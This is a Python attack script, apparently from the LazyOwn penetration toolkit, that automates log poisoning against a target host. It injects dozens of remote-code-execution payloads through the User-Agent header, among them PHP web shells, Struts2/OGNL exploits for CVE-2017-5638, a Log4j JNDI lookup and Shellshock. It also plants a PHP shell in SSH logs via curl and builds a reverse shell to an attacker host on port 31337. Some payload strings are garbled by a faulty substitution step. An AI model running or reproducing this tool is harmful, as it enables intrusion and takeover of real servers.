#!/usr/bin/env python3 
#_*_ coding: utf8 _*_
 
import requests
import signal
import argparse
import sys
import subprocess
BANNER = """
    __    ___              ____                            
   / /   /   |____  __  __/ __ \_      ______              
  / /   / /| /_  / / / / / / / / | /| / / __ \             
 / /___/ ___ |/ /_/ /_/ / /_/ /| |/ |/ / / / /             
/_________ |_/___/\__, /\____/ |__/|__/_/ /_/          __  
   / ____/_______/_////_ ___  ___ _      ______  _____/ /__
  / /_  / ___/ __ `/ __ `__ \/ _ \ | /| / / __ \/ ___/ //_/
 / __/ / /  / /_/ / / / / / /  __/ |/ |/ / /_/ / /  / ,<   
/_/ __/_/   \__,_/_/ /_/ /_/\___/|__/|__/\____/_/  /_/|_|  
   / /   ____  ____ _                                      
  / /   / __ \/ __ `/                                      
 / /___/ /_/ / /_/ /                                       
/_____/\____/\__, /                                        
    ____    /____/ __             _                        
   / __ \____  (_)/ /____  ____  (_)___  ____ _            
  / /_/ / __ \/ / __/ __ \/ __ \/ / __ \/ __ `/            
 / ____/ /_/ / (_  ) /_/ / / / / / / / / /_/ /             
/_/    \____/_/  _/\____/_/ /_/_/_/ /_/\__, /              
              /_/                     /____/               
[*] Iniciando: LazyOwn Log Poisoning [;,;]
"""
print(BANNER)    

def signal_handler(sig: int, frame: any) -> None:
    print(f'\n[*] Interrupción recibida, saliendo del programa.')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main():
    parser = argparse.ArgumentParser(description='LazyOwnLogPoisoning')
    parser.add_argument('--rhost', required=True, help='Host of the server')
    parser.add_argument('--lhost', required=True, help='host of the reverse shell')
    
    args = parser.parse_args()

    rhost = args.rhost
    lhost = args.lhost    
    # URL de la aplicación vulnerable
    url = rhost

    # Payload inyectado en el User-Agent
    cmd = f"bash -i >& /dev/tcp/{lhost}/31337 0>&1"  # Replace with your actual command

    payloads = {
        'PHP system': f"<?php system($_GET['cmd']); ?>",
		'PHP exec':f"<?php exec($_GET['cmd']); ?>",
		'PHP shell_exec':f"<?php shell_exec($_GET['cmd']); ?>",
		'PHP passtrhu':f"<?php passthru($_GET['cmd']); ?>",
		'PHP eval':f"<?php eval($_GET['cmd']); ?>",
		'PHP assert':f"<?php assert($_GET['cmd']); ?>",
		'Java':"${T(java.lang.Runtime).getRuntime().exec('{cmd}')}".replace('{cmd}',cmd),
        'ShellShock':"() { :;}; /bin/bash -i >& /dev/tcp/127.0.0.1/31337 0>&1'",
        'Python': f"import os; os.system(os.getenv('cmd'))",
        'Node.js': f"require('child_process').exec(require('url').parse(require('http').createServer(function (req, res) {{ res.writeHead(200, {{ 'Content-Type': 'text/plain' }}); res.end('Hello World'); }}).listen(3000).on('listening', function () {{ console.log('Server running at http://127.0.0.1:3000/'); }}).on('request', function (req, res) {{ require('querystring').parse(require('url').parse(req.url).query).cmd }}).cmd));",
        'Ruby': f"`ENV['cmd']`",
        'Java': f"Runtime.getRuntime().exec(System.getenv('cmd'))",
        'Perl': f"system($ENV{'cmd'})",
        'ASP.NET': f"System.Diagnostics.Process.Start(Environment.GetEnvironmentVariable('cmd'))",
        'Go': f"os/exec.Command(os.Getenv('cmd')).Run()",
        'Rust': f"std::process::Command::new(env::var('cmd').unwrap()).output().expect('failed to execute process');",
        'Lua': f"os.execute(os.getenv('cmd'))",
        'Bash': f"{cmd}",
        'PowerShell': f"Start-Process $env:cmd",
        'Elixir': f"System.cmd(\"bash\", [\"-c\", System.get_env(\"cmd\")])",
        'Kotlin': f"Runtime.getRuntime().exec(System.getenv('cmd'))",
        'Scala': f"sys.process.Process(System.getenv('cmd')).!",
        'Swift': f"let task = Process(); task.launchPath = \"/bin/bash\"; task.arguments = [\"-c\", ProcessInfo.processInfo.environment[\"cmd\"]!]; task.launch()",
        'TypeScript': f"require('child_process').exec(process.env.cmd)",
        'ColdFusion': f"#CreateObject(\"java\", \"java.lang.Runtime\").getRuntime().exec(variables.cmd)#",
        'Haskell': f"System.Process.system (getEnv \"cmd\")",
        'R': f"system(Sys.getenv('cmd'))",
        'Groovy': f"\"sh ${cmd}\"",
        'Erlang': f"os:cmd(os:getenv(\"cmd\")).",
        'Julia': f"run(`$ENV[\"cmd\"]`)",
        'Clojure': f"(clojure.java.shell/sh (System/getenv \"cmd\"))",
        'Dart': f"Process.runSync(Platform.environment['cmd'], []).stdout",
        'Scala (Play)': f"Runtime.getRuntime().exec(System.getenv('cmd'))",
        'Nim': f"osproc.execCmd(getEnv(\"cmd\"))",
        'Crystal': f"Process.run({cmd})",
        'V': f"os.exec(cmd)",
        'F#': f"System.Diagnostics.Process.Start(System.Environment.GetEnvironmentVariable(\"cmd\"))",
        'Elixir (Phoenix)': f"System.cmd(\"bash\", [\"-c\", System.get_env(\"cmd\")])",
        'Powershell (Windows)': f"Start-Process $env:cmd",
        'MATLAB': f"system(getenv('cmd'))",
        'Objective-C': f"system(getenv(\"cmd\"))",
        'Fortran': f"call execute_command_line(getenv('cmd'))",
        'OCaml': f"Unix.system (Sys.getenv \"cmd\")",
        'Scheme': f"(system (getenv \"cmd\"))",
        'Smalltalk': f"OSProcess command: (System getEnv: 'cmd')",
        'COBOL': f"call 'system' using by value address of cmd",
        'Struts2_RCE1': "%{{(#_='multipart/form-data').(#[email protected]('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#out.print('{}'),#out.flush(),#out.close())}}".format(cmd),
        'Tcl': f"exec $env(cmd)",
        'JSF_ELInjection': "#{request.setAttribute('exec', T(java.lang.Runtime).getRuntime().exec('{cmd}'))}".replace('{cmd}',cmd),
        'JSP_ELInjection': "${{new java.lang.ProcessBuilder('{cmd}'.split(' ')).start()}}".replace('{cmd}',cmd),
        'Log4j_JNDI': "${{jndi:ldap://{}/malware}}".format(lhost),
        'GroovyScriptEngine': "${{groovy.util.Eval.me('{cmd}')}}".replace('{cmd}',cmd),
        'Scripting_Language_Perl': f"perl -e 'exec \"{cmd}\"'",
        'Scripting_Language_Python': f"python -c 'import os; os.system(\"{cmd}\")'",
        'Scripting_Language_Ruby': f"ruby -e 'exec \"{cmd}\"'",
        'CVE-2019-19781': f"/vpn/../vpns/portal/scripts/newbm.pl",
        'CVE-2020-5902': f"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
        'CVE-2020-3452': f"/+CSCOT+/translation-table",
        'CVE-2018-13382': f"/vpn/../dana-na/../dana/html5acc/guacamole/scripts/sessionLogout",
        'CVE-2017-5638': "${{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}}".replace('{cmd}',cmd),
        'CVE-2021-22986': f"/mgmt/tm/util/{cmd}"
    }

    # Formatear cada payload con el comando
    formatted_payloads = {lang: payload.replace('cmd', cmd) for lang, payload in payloads.items()}

    # Enviar la solicitud para cada payload
    for lang, payload in formatted_payloads.items():
        headers = {
            'User-Agent': payload
        }
        try:
            response = requests.get(url, headers=headers)
            print(f"[*] Payload inyectado en {lang}. Respuesta del servidor: {response.status_code}")

        except:
            print(f"[-] Error request: {url} payload: {payload}")
    # SSH Log Poisoning mediante ssh y curl
    # Define el comando curl con la autenticación y la URL
    url = url.replace('http://','')
    url = url.replace('https://','')
    command = [
        'curl',
    	'-u', '<?php system($_GET["cmd"]);?>',  # Autenticación
    	'sftp://'+url+'/anything',  # URL del recurso
    	'-k'
    ]
    # Ejecuta el comando y captura la salida
    result = subprocess.run(command, capture_output=True, text=True)

    # Imprime la salida
    print(result.stdout)
if __name__ == "__main__":
    main()
